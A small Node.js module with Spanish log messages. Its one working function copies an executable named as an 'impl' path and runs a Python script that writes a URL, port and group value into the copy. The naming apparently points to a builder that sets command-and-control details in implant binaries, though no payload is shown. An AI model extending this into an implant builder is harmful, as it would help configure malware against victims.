import { spawn } from "child_process";
import path from "path";
import fs from 'fs';


const runPowerShellCommand = (args, cwd) => {
    return new Promise((resolve, reject) => {
        const ps = spawn('powershell.exe', args);

        let output = '';
        let errorOutput = '';

        ps.stdout.on('data', (data) => {
            output += data.toString();
        });

        ps.stderr.on('data', (data) => {
            errorOutput += data.toString();
        });

        ps.on('close', (code) => {
            if (code === 0) {
                resolve(output.trim());
            } else {
                reject(new Error(`PowerShell error: ${errorOutput}`));
            }
        });

        ps.on('error', (err) => {
            reject(err);
        });
    });
};



const python_processing =async(impl_path="",url,port,group)=>{
}
const exe_processing =async(impl_path="",url,port,group)=>{

    try {

        console.log(`python3 ${path.normalize('./scripts/append_text.py')} -f ${impl_path} -t write -u ${url} -p ${port} -g ${group}`);

        const copy_path = impl_path.replace('.exe', '_copy.exe')
        
        const copy = await runPowerShellCommand([`copy`, impl_path, copy_path ]);
        
        const replace = await runPowerShellCommand([`python`, path.normalize('./scripts/append_text.py'), '-f', copy_path, '-t', 'write', '-u', url, '-p', port, '-g', group]);
        console.log(replace);
        
        console.log("Comandos ejecutados correctamente");
    } catch (error) {
        console.error("Error al ejecutar comandos de PowerShell:", error);
    }

}
const bin_processing =async(path="",url,port,group)=>{

}


export { python_processing, exe_processing, bin_processing }


